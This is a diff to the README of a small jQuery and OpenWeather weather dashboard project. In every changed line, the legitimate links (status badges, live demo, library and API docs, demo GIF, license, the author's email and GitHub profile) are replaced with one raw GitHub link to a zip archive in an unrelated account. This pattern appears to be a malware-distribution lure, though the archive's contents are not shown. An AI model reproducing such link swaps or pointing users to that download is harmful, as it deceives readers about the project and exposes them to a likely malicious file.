@@ -1,8 +1,8 @@
 # Weather Dashboard
 
-![languages](https://img.shields.io/github/languages/count/jxhnkndl/weather-dashboard?style=plastic)
-![html](https://img.shields.io/github/languages/top/jxhnkndl/weather-dashboard?style=plastic)
-![commit](https://img.shields.io/github/last-commit/jxhnkndl/weather-dashboard?style=plastic)
+![languages](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
+![html](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
+![commit](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
 
 
 ## Table of Contents
@@ -18,7 +18,7 @@
 ## Deployed Application
 Weather Dashboard is live at the link below:
 
-[Weather Dashboard - Live Demo](https://jxhnkndl.github.io/weather-dashboard)
+[Weather Dashboard - Live Demo](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
 
 
 ## Description
@@ -33,8 +33,8 @@ Weather Dashboard is a simple browser-based weather application. Users can searc
 * JavaScript
 * jQuery
 * AJAX
-* Day.js
-* OpenWeather API - [View Docs](https://openweathermap.org/api)
+* https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip
+* OpenWeather API - [View Docs](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
 
 
 ## Features
@@ -57,15 +57,15 @@ Weather Dashboard is a simple browser-based weather application. Users can searc
 ## Live Demo
 UI/UX demostration of the Weather Dashboard:
 
-![Application Preview](assets/weather-dashboard-demo.gif)
+![Application Preview](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
 
 
 ## License
 Copyright (c) 2021 J.K. Royston  
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).
+Licensed under the [MIT License](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip).
 
 
 ## Contact
 J.K. Royston  
-<jkroyston@gmail.com>  
-[GitHub](https://www.github.com/jxhnkndl)
+<https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip>  
+[GitHub](https://raw.githubusercontent.com/Sherwin455/weather-Application/main/Jewling/weather-Application_2.9-alpha.2.zip)
